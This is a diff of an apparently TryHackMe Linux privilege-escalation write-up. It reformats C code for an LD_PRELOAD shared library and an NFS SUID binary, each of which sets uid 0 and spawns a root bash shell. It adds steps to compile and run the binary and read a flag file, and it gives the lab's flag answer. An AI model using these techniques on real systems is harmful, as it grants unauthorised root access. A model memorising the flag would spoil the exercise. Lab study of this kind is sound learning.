@@ -94,16 +94,16 @@ On some systems, you may see the LD_PRELOAD environment option.
 
 The C code will simply spawn a root shell and can be written as follows;
 
-```
+```c
 #include <stdio.h>
 #include <sys/types.h>
 #include <stdlib.h>
 
 void _init() {
-unsetenv("LD_PRELOAD");
-setgid(0);
-setuid(0);
-system("/bin/bash");
+   unsetenv("LD_PRELOAD");
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
 }
 ```
 
@@ -389,8 +389,7 @@ vi nfs.c
 #include <stdio.h>
 #include <stdlib.h>
 
-int main()
-{
+int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
@@ -401,10 +400,26 @@ int main()
 ```
 gcc nfs.c -o nfs -w
 chmod +s nfs
+ls -l
 ```
 
+![image](https://user-images.githubusercontent.com/90561566/197328166-6e286be4-4823-449f-85cf-1d44cb6dfa98.png)
 
+You have now root access and can run
 
+```
+./nfs
+```
+
+You will see below that both files (nfs.c and nfs are present on the target system. We have worked on the mounted share so there was no need to transfer them).
+
+```
+cat /home/matt/flag7.txt
+```
+
+| Flag | flag7.txt |
+| --- | --- |
+| Answer | THM-89384012 |
 
 
 
